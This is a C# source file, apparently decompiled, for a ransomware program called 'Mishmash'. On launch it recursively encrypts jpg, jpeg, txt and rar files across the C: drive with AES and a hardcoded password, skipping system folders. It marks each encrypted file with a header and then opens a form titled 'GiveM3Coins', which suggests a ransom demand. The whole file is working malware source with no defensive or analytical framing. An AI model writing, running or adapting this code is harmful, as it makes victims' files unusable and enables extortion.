using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Mishmash;

internal class Program
{
	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static char[] password = new char[4] { 'p', 'a', 's', 's' };

	private static readonly string[] extensionsToEncrypt = new string[4] { "jpg", "jpeg", "txt", "rar" };

	[STAThread]
	public static char[] GetPass()
	{
		return password;
	}

	private static void Main()
	{
		ProtectFiles();
		SetStartup();
		CreateUI();
	}

	private static void SetStartup()
	{
	}

	private static void CreateUI()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		GiveM3Coins giveM3Coins = new GiveM3Coins();
		Application.Run((Form)(object)giveM3Coins);
	}

	public static void DescrambleFile(string fileEncrypted, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted).Skip(8).ToArray();
		byte[] array = Descramble(bytesToBeDecrypted, bytes);
		FileStream fileStream = File.Open(fileEncrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileEncrypted, FileMode.Append);
		fileStream2.Write(array, 0, array.Length);
		Console.WriteLine("Unprotected: " + fileEncrypted);
	}

	public static void ScrambleFile(string fileUnencrypted)
	{
		string fileName = Path.GetFileName(fileUnencrypted);
		if (fileName.StartsWith("$") || fileName.StartsWith("#"))
		{
			return;
		}
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytesToBeEncrypted = File.ReadAllBytes(fileUnencrypted);
		byte[] array = Scramble(bytesToBeEncrypted, bytes);
		FileStream fileStream = File.Open(fileUnencrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileUnencrypted, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes("M!shMash");
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			Console.WriteLine("Encrypted: " + fileUnencrypted);
			count++;
			encryptedFiles.Add(fileUnencrypted);
		}
	}

	public static void ProtectFiles()
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 1, "");
	}

	public static void UndoProtectFiles(string decryption_password)
	{
		string targetDirectory = "C:\\";
		ProcessDirectory(targetDirectory, 0, decryption_password);
	}

	public static void ProcessDirectory(string targetDirectory, int action, string password)
	{
		IEnumerable<string> enumerable = from file in Directory.EnumerateFiles(targetDirectory, "*.*")
			where extensionsToEncrypt.Any((string x) => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))
			select file;
		foreach (string item in enumerable)
		{
			ProcessFile(item, action, password);
		}
		string[] directories = Directory.GetDirectories(targetDirectory);
		string[] array = directories;
		foreach (string text in array)
		{
			try
			{
				if (!text.Contains("All Users\\Microsoft\\") && !text.Contains("$Recycle.Bin") && !text.Contains("C:\\Windows") && !text.Contains("C:\\Program Files") && !text.Contains("Temporary Internet Files") && !text.Contains("AppData\\") && !text.Contains("\\source\\") && !text.Contains("C:\\ProgramData\\") && !text.Contains("\\Mishmash-master\\") && !text.Contains("\\Mishmash\\"))
				{
					ProcessDirectory(text, action, password);
				}
			}
			catch
			{
			}
		}
	}

	public static bool IsMarked(string fileName)
	{
		byte[] bytes = Encoding.ASCII.GetBytes("M!shMash");
		byte[] second = File.ReadAllBytes(fileName).Take(8).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(fileName);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string fileName, int action, string password)
	{
		if (action == 1 && !IsMarked(fileName))
		{
			try
			{
				ScrambleFile(fileName);
				return;
			}
			catch
			{
				return;
			}
		}
		if (action == 0 && IsMarked(fileName))
		{
			try
			{
				DescrambleFile(fileName, password);
			}
			catch
			{
			}
		}
	}

	public static byte[] Scramble(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static byte[] Descramble(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}
}
